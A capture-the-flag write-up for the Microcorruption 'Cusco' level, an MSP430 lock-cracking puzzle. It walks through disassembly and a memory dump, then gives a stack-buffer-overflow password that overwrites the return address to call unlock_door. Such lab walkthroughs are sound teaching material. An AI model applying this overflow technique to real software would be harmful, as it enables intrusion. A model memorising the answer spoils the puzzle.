# MICROCORRUPTION

## Cusco Writeup

Author :[Udit Prasad](https://github.com/uditpd3000)

### Walkthrough

Main function was calling Login function so i explored the Login function where i found this.
```
4524:  0f93           tst	r15
4526:  0524           jz	#0x4532 <login+0x32>
4528:  b012 4644      call	#0x4446 <unlock_door>
452c:  3f40 d144      mov	#0x44d1 "Access granted.", r15
4530:  023c           jmp	#0x4536 <login+0x36>
4532:  3f40 e144      mov	#0x44e1 "That password is not correct.", r15
```
and r15 was always 0 after execution of `test_password_valid` function. So we were simply jumping the `access_door` function.

Now we can think of overwrite and try to call the `unlock_door` function by giving its address in the return address of some function.
when i tried to debug the code with some random password say `AAAAAAAAAAAAAAAAAA`.
Then live memory dump was this at the time of return of login function
```
43e0:   5645 0300 ca45 0000 0a00 0000 3a45 4141   VE...E......:EAA
43f0:   4141 4141 4141 4141 4141 4141 4141 4141   AAAAAAAAAAAAAAAA
```
And stack pointer was pointing at #0x43fe.
So we can use stack buffer overflow to directly call `unlock_door` whose address is `#0x4446`.
Also it is little endian so keeping in mind this fact lets try the password `9b9b9b9b9b9b9b9b9b9b9b9b9b9b9b9b4644`
And yes it worked.

### Password

```
9b9b9b9b9b9b9b9b9b9b9b9b9b9b9b9b4644
```
